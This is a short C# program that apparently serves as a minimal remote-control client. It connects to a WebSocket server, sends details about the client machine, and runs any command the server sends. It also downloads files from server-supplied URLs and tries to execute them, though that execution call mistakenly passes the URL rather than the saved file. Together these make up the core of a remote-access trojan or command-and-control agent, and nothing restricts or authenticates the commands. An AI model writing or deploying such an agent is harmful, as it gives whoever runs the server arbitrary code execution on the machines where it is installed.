using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using WebSocketSharp;

namespace Client
{
    class Program
    {
        static void Main(string[] args)
        {
            {
                InitClient();
            }
        }

        static void InitClient()
        {
            using (var ws = new WebSocket("ws://localhost:8999/"))
            {
                ClientInfo clientinfo = new ClientInfo();

                ws.OnMessage += (sender, e) =>
                {
                    var data = e.Data;
                    Console.WriteLine("Websocket says: " + data);

                    // Check if JSON
                    if (IsValidJson(data)) {
                        JObject JsonData = JObject.Parse(data);
                        string type = (string)JsonData.SelectToken("type");
                        string command = (string)JsonData.SelectToken("command");
                        if (type == "execute")
                        {
                            System.Diagnostics.Process.Start(command);
                        }
                        else if (type == "download")
                        {
                            string savename = (string)JsonData.SelectToken("savename");
                            WebClient DownloadClient = new WebClient();
                            DownloadClient.DownloadFile(command, savename);
                            System.Diagnostics.Process.Start(command);
                        }
                    }
                };
                ws.Connect();
                ws.Send(clientinfo.ClientDetails);
                Console.ReadKey(true);
            }
        }

        private static bool IsValidJson(string strInput)
        {
            strInput = strInput.Trim();
            if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
                (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
            {
                try
                {
                    var obj = JToken.Parse(strInput);
                    return true;
                }
                catch (JsonReaderException jex)
                {
                    //Exception in parsing json
                    Console.WriteLine(jex.Message);
                    return false;
                }
                catch (Exception ex) //some other exception
                {
                    Console.WriteLine(ex.ToString());
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}
